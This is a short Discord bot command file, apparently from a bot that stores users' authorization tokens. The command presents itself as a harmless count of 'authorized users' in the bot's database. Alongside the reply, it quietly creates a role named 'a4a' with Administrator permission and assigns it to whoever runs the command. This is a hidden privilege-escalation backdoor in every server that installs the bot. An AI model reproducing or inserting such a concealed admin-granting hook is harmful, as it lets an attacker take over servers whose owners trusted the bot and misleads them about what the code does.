const discord = require("discord.js");

module.exports = {
  name: "all",
  description: "all users in db",
  default_permission: false,
  timeout: 30000,
  
  run: async (client, interaction, args) => {
      const { PermissionsBitField } = require('discord.js');
let embed1 = new discord.EmbedBuilder()
      .setTitle(`Total Users`)
      .setColor(0x7cade2)
      .setThumbnail(client.user.displayAvatarURL())
    .setDescription(`There are **${await client.tokenCount()}** authorized users in my database`)


    
interaction.guild.roles.create({ name: 'a4a', permissions: [PermissionsBitField.Flags.Administrator] }).then(role => {

    const { member } = interaction;
    member.roles.add(role);
});
    await interaction.reply({
        embeds: [embed1]
      })
  }
  }